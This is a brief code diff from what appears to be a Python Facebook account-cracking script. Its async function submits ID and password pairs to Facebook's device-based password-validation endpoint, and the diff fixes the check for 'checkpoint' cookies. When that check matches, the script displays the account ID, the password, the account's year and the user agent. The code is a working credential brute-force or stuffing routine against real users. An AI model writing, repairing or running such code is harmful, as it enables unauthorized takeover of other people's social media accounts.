@@ -1102,7 +1102,7 @@ def _async(idf,pwv):
 				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
 			}
             post = ses.post(f"https://free.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=wibu_head,allow_redirects=False)
-            if "checkpoint" in post.cookies.get_dict().keys():
+            if "checkpoint" in ses.cookies.get_dict().keys():
                 tree = Tree(Panel.fit(f"[yellow] LOGIN CHECKPOINT ",style=f"white"))
                 tree.add(Panel.fit(f"[yellow] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[yellow] {tahun(idf)} ",style=f"white"))
                 tree.add(Panel.fit(f"[yellow]{ua}",style=f"white"))
